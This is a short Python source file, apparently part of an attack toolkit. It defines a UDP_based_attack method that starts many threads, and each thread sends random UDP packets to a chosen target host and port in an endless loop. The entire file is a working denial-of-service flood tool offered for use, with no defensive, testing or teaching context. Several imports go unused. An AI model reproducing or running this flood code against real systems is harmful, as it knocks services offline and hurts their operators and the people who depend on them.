import socket
import time
import random
import threading
import sys
import os

from colorama import Fore, Back, Style
from faker import Faker

class Network:
    def UDP_based_attack(self, target:str, port:int, threads:int) -> None:
        def attack():
            try:
                Bytes = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while True:
                    data = Bytes*random.randint(5, 22)
                    size = str(len(data))
                    sock.sendto(Bytes*random.randint(5, 22), (target, int(port)))
            except Exception as error:
                print(" [-] " + str(error))
        print(" [*] Attacking...")
        print(" [*] Launching all threads...")
        for x in range(int(threads)):
            threading.Thread(target=attack).start()
        print(" [+] All threads launched!")